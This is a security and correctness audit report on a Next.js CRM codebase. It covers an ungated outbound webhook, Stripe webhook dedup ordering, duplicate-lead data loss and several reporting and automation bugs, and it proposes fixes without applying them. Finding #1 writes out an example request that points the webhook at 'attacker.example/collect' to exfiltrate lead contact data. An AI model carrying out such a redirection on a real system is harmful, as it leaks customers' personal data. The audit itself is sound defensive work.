## 1. Any SALES-role teammate can silently redirect a live copy of every lead's contact details to an external URL — no admin gate, no audit event — security/authorization, high severity, confirmed

`src/app/api/webhooks/outbound/route.ts:34`

```ts
export async function POST(request: NextRequest) {
  const ctx = await getSessionContext();
  if (!ctx) return NextResponse.json({ success: false, message: "Not signed in." }, { status: 401 });
```

That is the entire authorization check on the setting that controls where FollowUp POSTs
lead data. `src/lib/outboundWebhook.ts:52-64` shows what goes out, on every new lead and
every stage change:

```ts
const payload = { event, leadId, name, email, phone, source, stage, dealValue, createdAt, timestamp, ...extra };
```

**What an attacker does.** A SALES-role team member (or anyone with a stolen SALES session
cookie — the tier that's *meant* to be the low-privilege one) POSTs
`{"url":"https://attacker.example/collect"}` to `/api/webhooks/outbound`. From that moment
every lead the business captures on any channel, plus every pipeline stage change, is
mirrored in real time to the attacker's endpoint with full name, email, phone, source and
deal value. Nothing in the product tells an admin: the setting lives in Settings behind a
tab, and — unlike every comparable route — this handler never calls `recordAudit`, so
`/api/business/export`'s audit log and the lead Trust panel both show nothing.

**Why this is inconsistent rather than a design choice.** Every other business-level
integration setting in this codebase is admin-gated *and* audited:

- `src/app/api/webhooks/config/route.ts` — the *inbound* webhook secret, `requireAdmin`
- `src/app/api/crm/config/route.ts:32,47` — `requireAdmin` + `recordAudit("integration.crm.update")`
- `src/app/api/twilio/config/route.ts`, `instagram/config`, `facebook/config`,
  `integrations/{gmail,outlook}/{connect,disconnect}` — all `requireAdmin`
- `src/app/api/business/export/route.ts:81` — `requireAdmin`, because "this is the whole
  business's data rather than just the caller's own"

The outbound webhook is the one setting that exfiltrates that same whole-business data
*continuously*, and it's the one that was left ungated. The SSRF work
(`2026-09-09-fourth-pass-audit.md` finding #1) hardened *where* this URL may point; it never
revisited *who* may set it.

**Fix shape** (not applied): `requireAdmin(ctx)` on POST (and on PUT, the test-fire), plus
`recordAudit(ctx, "integration.outbound_webhook.update", { meta: { host } })` — host only,
never the full URL, per `recordAudit`'s own "identifiers and counts" contract
(`src/lib/audit.ts:5-9`).

Same missing gate, much lower impact, in `src/app/api/twilio/number/route.ts:64` — any
signed-in user can rewrite the business's Twilio number webhooks. It only ever writes this
app's own URLs using credentials already on file, so there's no exfiltration path; worth
fixing in the same pass for consistency, not on its own.

## 2. The Stripe webhook marks an event processed *before* processing it and never rolls that back — one transient error permanently swallows a subscription change — billing correctness, medium-high severity, confirmed

`src/app/api/billing/webhook/route.ts:36-43`

```ts
try {
  await prisma.processedWebhookEvent.create({ data: { eventId: event.id } });
} catch (err) {
  if (err && typeof err === "object" && "code" in err && err.code === "P2002") {
    return NextResponse.json({ received: true, duplicate: true });
  }
  throw err;
}

switch (event.type) { ... }   // everything that actually applies the event runs AFTER
```

The dedup row is committed first, and there is no `delete` on the failure path. Every
handler below it can throw:

- `stripe.subscriptions.retrieve(...)` (lines 57, 73) — a network blip, a 429, a Stripe
  incident;
- `prisma.business.findUnique({ where: { stripeCustomerId: customerId } })` (line 75) — note
  this one has **no `select`**, so the `credentialEncryption` extension decrypts
  `twilioAuthToken`, `instagramAccessToken` and `facebookPageAccessToken` on the way out
  (`src/lib/db.ts:20`). `decryptSecret` throws hard on a malformed value or a rotated
  `TOKEN_ENCRYPTION_KEY` (`src/lib/crypto.ts:61-63`) — a *permanent* throw, not a transient
  one;
- `syncSubscription`'s `prisma.business.update` (line 111).

**What an unlucky user does.** A customer upgrades Plus → Pro. Stripe delivers
`customer.subscription.updated`. The route writes `ProcessedWebhookEvent`, then
`subscriptions.retrieve` times out. The route throws, Next returns 500, Stripe retries the
same `event.id` — which now hits `P2002` and gets `200 {received:true, duplicate:true}`.
`Business.tier` is never updated. The customer is charged Pro and stays on Plus limits
until some *later*, unrelated subscription event happens to re-sync the row. The mirror
failure is worse: a `customer.subscription.deleted` lost this way leaves
`subscriptionStatus: "active"`, so `hasActiveAccess()` (`src/lib/billing.ts:52`) keeps a
cancelled business fully unlocked indefinitely.

**Confidence:** high on the code path. I could not exercise a live Stripe failure, so the
*frequency* is unverified — but the design is "record success before doing the work," and
the retry that exists to cover exactly this is disarmed by the row that was already written.

**Fix shape** (not applied): either delete the `ProcessedWebhookEvent` row in a `catch`
around the switch before rethrowing, or do the insert and the handler inside one
`prisma.$transaction` so the marker rolls back with the work. Add a `select` to line 75
while there — it needs `id` and nothing else, and currently decrypts three real
credentials to get it. `src/lib/__tests__/billingWebhook.test.ts` covers the happy dedup
path but has no "handler throws → event must remain retryable" case; that's the test to add
with the fix.

## 3. Embed widget and generic lead webhook silently drop a submission when the duplicate collides on PHONE instead of email — data loss, medium severity, confirmed

`src/app/api/embed/[businessId]/lead/route.ts:169-180` and the identical block in
`src/app/api/webhooks/lead/[secret]/route.ts:151-162`:

```ts
if (err && typeof err === "object" && "code" in err && err.code === "P2002") {
  const existing = await prisma.lead.findUnique({ where: { businessId_email: { businessId, email } } });
  if (existing && message) { ... append + rescore + re-ack ... }
  return NextResponse.json({ success: true });
}
```

`Lead` has **two** unique constraints, not one (`prisma/schema.prisma:329,336`):

```prisma
@@unique([businessId, email])
@@unique([businessId, phone])
```

The recovery path only handles the first. Both routes accept a phone number
(`embedLeadSchema`/`webhookLeadSchema`, `phone: cleanedText(40)`) and both explicitly allow
a submission with a phone and no email (`if (!email && !phone)` is the only requirement).

**What an unlucky user does.** A visitor who previously submitted the form with their phone
number comes back and submits again — phone the same, email left blank (or a different
address). `prisma.lead.create` throws `P2002` on `(businessId, phone)`. The catch then looks
the lead up by `businessId_email` with `email === ""` — `cleanedText` turns a missing field
into `""` (`src/lib/validation.ts:73`), and no lead is ever stored with `email: ""` (the
create writes `email || null`). `existing` is `null`, the `if` is skipped, and the route
returns `{ success: true }`. The visitor's message — "actually, can you also quote me for X"
— is never written anywhere. The generic webhook additionally returns
`{ success: true, leadId: undefined }` to the integration that sent it.

This is the *same* silent-drop bug `2026-09-08-third-pass-audit.md` finding #2 reported and
that PR fixed — the fix just only covered the email constraint. The regression test
(`src/lib/__tests__/duplicateLeadResubmission.test.ts`) pins the email case with
`phone: ""` in every fixture, so it passes while this path stays broken.

Related, same root cause, cosmetic: `src/app/api/leads/route.ts:84-88` returns
`"You already have a lead with this email."` for *any* `P2002`, so a manual add that
collides on phone tells the user the wrong thing.

**Fix shape** (not applied): branch on which constraint fired —
`err.meta?.target` carries it — or simply fall back to
`prisma.lead.findFirst({ where: { businessId, OR: [{ email }, { phone }] } })` when `email`
is empty or the email lookup misses. Extend `duplicateLeadResubmission.test.ts` with a
phone-collision case in the same commit.

## 4. The weekly "what FollowUp saved you" digest attributes every rescued lead to its OLDEST follow-up — a Date is compared against `new Date(<hours>)` — reporting correctness, low-medium severity, confirmed

`src/lib/rescued.ts:53-56`

```ts
const existing = rescuedByLead.get(f.leadId);
const hours = Math.max(1, Math.round((f.repliedAt.getTime() - f.sentAt.getTime()) / 3_600_000));
if (!existing || f.repliedAt > new Date(existing.repliedAfterHours)) {
```

`existing.repliedAfterHours` is a **count of hours** (computed on the line directly above),
not a timestamp. `new Date(5)` is 1970-01-01T00:00:00.005Z, so
`f.repliedAt > new Date(existing.repliedAfterHours)` is `true` for every real reply, always.
The "keep the most recent reply" guard never fires.

The query is `orderBy: { sentAt: "desc" }` (line 47), so the loop runs newest-first and the
*last* unconditional overwrite wins — meaning the entry that survives is the **oldest**
automated follow-up for that lead in the window, the exact opposite of the intent.

**What an unlucky user sees.** A lead gets the instant acknowledgement on Monday and replies
2h later; the silence rule follows up on Friday and they reply 1h later. Monday's row is
written last and wins. The Friday digest tells the owner
`"- Jamie — instant reply, replied 2h later"` when what actually won the conversation back
was Friday's silence follow-up at 1h. Counts (`rescued`, `answeredForYou`, `booked`,
`valueInPlay`, `wonValue`) are all unaffected — this only corrupts the per-lead `trigger`
and `repliedAfterHours` shown in `renderRescueDigest`'s "Who came back" list
(`src/lib/rescued.ts:117-121`) and wherever `RescueReport.leads` is rendered in-app.

The existing test (`src/lib/__tests__/rescued.test.ts:41-47`) gives both rows the same
`sentAt`/`repliedAt` and never asserts on `trigger`, so it passes either way.

**Fix shape** (not applied): track the reply timestamp alongside the derived hours, e.g.
keep `repliedAt` on the map value and compare `f.repliedAt > existing.repliedAt`. Add a
test case with two rows for one lead at different times asserting the newer trigger wins.

## 5. A lead that finishes or exits a workflow is left with automation permanently OFF, with no record of what it was before — trust/product, low severity, confirmed

`enrollLead` forces the tier off (`src/lib/sequences.ts:226-231`):

```ts
// A lead can't be run by both the silence-based automation and a
// workflow at once — enrolling turns the former off for this lead so
// the workflow's own cadence is the only thing steering it.
automationTier: "OFF",
```

Nothing ever puts it back. Every exit path clears only the three sequence columns:
`unenrollLead` (`sequences.ts:273-277`), the stop-on-reply branch (`:453-456`), the
step-gone branch (`:427-430`), the no-reachable-channel branch (`:537-540`), the risk-hold
branch (`:604-613`), and normal completion (`:665-668`). A grep of every
`automationTier` write in `src/lib` and `src/app/api` confirms only three writers exist —
`enrollLead`, `applySourceRouting`'s tier default, and `POST /api/leads/[id]/automation` —
and none of them is a restore.

**What an unlucky user gets.** A business sets a source rule "Website form → enrol in
*New enquiry* workflow" (`src/app/api/source-rules/route.ts`). Every web-form lead is
enrolled at creation and flipped to `OFF`. The workflow's last step runs, the lead is
unenrolled, and from then on it is invisible to `runAutomationForBusiness` — the silence
rule, the "reply for me when I haven't" neglect trigger and the dead-lead reactivation all
filter on `automationTier: { not: "OFF" }` (`src/lib/automation.ts:144,246,263`). The lead
that just finished a workflow without converting is precisely the one the neglect trigger
exists for, and it has been quietly excluded. Restoring it requires noticing the `off` badge
on that one lead's page and setting the tier by hand.

The instant acknowledgement is caught by the same flip *before* the workflow even starts:
`applySourceRouting` runs before `acknowledgeNewLead` in both public capture routes
(`embed/[businessId]/lead/route.ts:136` then `:155`), and `acknowledgeNewLead` returns early
on `automationTier === "OFF"` (`src/lib/acknowledge.ts:278`). So a source rule that enrols
into a workflow also silently turns off the sub-minute first reply for that whole channel.

This is arguably a deliberate reading of "OFF means off" rather than a coding mistake, which
is why it's ranked low — but it is not documented anywhere as intended, and it inverts the
product's first guarantee for a configuration a business would reasonably expect to *add*
automation. Fixing it properly needs a stored "tier before enrolment" column, which is a
schema change, so this is a **hand-off, not a drive-by fix**.

## 6. `computeAutomationStatus` and `findUnansweredLeads` disagree on what counts as a real reply — the lead page promises action ~21 hours before the engine takes it — low severity, confirmed

`src/lib/automation.ts:175-178` counts two kinds of substantive outbound:

```ts
const hasDirectEchoReply = all.some((m) => m.direction === "outbound" && m.source);
const hasSubstantiveFollowUp = lead.followUps.some((f) => f.trigger !== "instant_ack");
const hasSubstantiveOutbound = hasDirectEchoReply || hasSubstantiveFollowUp;
const effectiveCutoff = hasSubstantiveOutbound ? cutoff : firstReplyCutoff;
```

`src/lib/automationStatus.ts:126-127` counts only one:

```ts
const hasSubstantiveFollowUp = lead.followUpTriggers.some((t) => t !== "instant_ack");
const thresholdHours = hasSubstantiveFollowUp ? rules.unansweredHours : UNANSWERED_FIRST_REPLY_HOURS;
```

`Message.source` is the marker for a reply FollowUp captured but didn't send — Meta's own
Business AI, or a teammate answering from the native Instagram/Messenger app
(`prisma/schema.prisma:414`, `Message.source`; written by `captureDirectReply`,
`src/lib/instagram.ts:179-199`). Those never create a `FollowUp` row, which is exactly why
`automation.ts` checks the message and not just the triggers.

**What an unlucky user sees.** An Instagram lead DMs; Meta's Business AI answers (captured as
`outbound` with `source: "instagram_direct"`); the lead writes again. The last message is now
inbound and there are no `FollowUp` rows. The lead page shows
`due_soon: unanswered` after 3 hours (`UNANSWERED_FIRST_REPLY_HOURS`), while the hourly cron
correctly waits the full 24 (`UNANSWERED_DEFAULT_HOURS`). The owner watches a lead sit in
"FollowUp will reply to this" for the better part of a day with nothing happening — the
precise confusion the file's own header says it exists to eliminate
(`automationStatus.ts:6-11`).

The data is already available: `leads-data.ts:45` puts `source` on every mapped message, and
`AutomationStatusLead` already receives the full `conversation`. The fix is one extra
`.some()` inside `computeAutomationStatus`.

## Minor: needless decryption of credentials at rest

Three queries pull models in `ENCRYPTED_FIELDS` (`src/lib/db.ts:18-22`) with no `select`, so
`decryptSecret` runs over real third-party credentials the caller never uses:

- `src/lib/team.ts:218` — `prisma.user.findUnique({ where: { id: targetUserId }, include: { integrations: true } })`, used only for
  `target.integrations.some((i) => i.status === "connected")` at line 233. Decrypts every
  Gmail/Outlook access and refresh token the removed member holds. `select: { integrations: { select: { status: true } } }`
  is the whole fix — `src/lib/admin-data.ts:150-153` already does exactly that.
- `src/app/api/billing/webhook/route.ts:75` — see finding #2.
- `src/lib/businessData.ts:54` and `:163` — full `Business` rows fetched for an export that
  then hand-picks safe fields (`:105-126`) and for a name check.

No leak: none of these values reaches a response body. Flagged because it's the pattern the
encryption extension exists to keep narrow, and because in `businessData.ts` and the billing
webhook it turns a rotated/misconfigured `TOKEN_ENCRYPTION_KEY` into a hard failure of an
unrelated operation.

## Areas checked and found clean

Reported honestly, so the next pass doesn't re-walk them:

- **Multi-tenant scoping** — genuinely good. Every `/api/leads/[id]/*` route confirms
  ownership before acting (`send:32`, `automation:27`, `stage:24`, `followup:30`,
  `regenerate:32`, `dismiss-hold` via `pendingApprovals.ts:136`, `claim`/`assign` via
  `assignment.ts:57,93`); `sequences.ts` re-checks `businessId` on every id it's handed;
  `saved-filters`, `team`, `notifications` (user-scoped, correctly), `source-rules:74`,
  `filtered/[id]/restore:25` all check. `admin-data.ts` is the one deliberate cross-tenant
  file and is double-gated. I found no query that trusts a request-supplied id.
  The one unscoped write is `twilio/status/[secret]/route.ts:51`
  (`updateMany({ where: { externalId: messageSid } })`) — `Message.externalId` is
  `@unique` and a Twilio SID is not guessable, so it isn't exploitable in practice; the
  comment there already explains the reasoning.
- **Races** — the atomic-claim pattern is applied consistently and correctly:
  `assignment.ts:98`, `automation.ts:304`, `sequences.ts:399`, `acknowledge.ts:296`,
  `engagement.ts:57`, `twilio.ts` `claimMissedCallTextBack`, and the advisory-lock
  transactions in `rateLimit.ts:30` and `office/runner.ts:127`. The office runner's spend
  ceiling in particular is the correct shape. P2002-catch find-or-create is used properly in
  `twilio.ts:192`, `instagram.ts:143`, `conversations.ts:45` and the Gmail lead create
  (`gmail.ts:620`).
- **Send path** — the opt-out hard stop (`sending.ts:201`), the risk gate on every automated
  path including workflow steps (`sequences.ts:586`), the stop-on-reply unenrol
  (`sequences.ts:448`), and the `ai.send`/`ai.hold` audit writes are all where they should
  be. `detectReplies` (`outcomes.ts`) correctly consumes each inbound message once.
- **Auth** — OAuth `state` is validated on the Gmail, Outlook, Instagram and Facebook
  callbacks; cron routes all check `CRON_SECRET`; Twilio signature verification is mandatory
  on every inbound; `/admin` and `/api/office/run` fail closed on `PLATFORM_ADMIN_EMAILS`;
  the JWT re-validates `businessId` every 5 minutes so a removed member loses access without
  waiting for token expiry (`auth.ts:189-202`).
- **SSRF** — `ssrf.ts` is thorough (IPv4/IPv6/mapped, `all: true` resolution, fail-closed on
  unparseable, `redirect: "manual"` at both call sites, re-checked before every fire).
- **GDPR paths** — `businessData.ts` deletes in a correct leaf-first transaction and the
  export deliberately omits every credential.

## Checked but not resolved

- `getPendingApprovals` (`src/lib/pendingApprovals.ts:62-67`) combines
  `distinct: ["targetId"]` with `take: 500`. If Prisma applies `take` at the database level
  *before* in-memory de-duplication, a busy business's approval queue would silently lose
  older-but-still-pending holds once 500 newer `AuditEvent` rows exist — a trust-guarantee
  failure, since a held draft vanishing from "what needs my OK" is indistinguishable from
  one that was resolved. I could not determine Prisma 6.19's actual behaviour here without a
  live database, so I am **not** calling this a finding. Worth ten minutes with a seeded DB:
  insert 600 audit events across 3 leads and check the queue still returns all three.
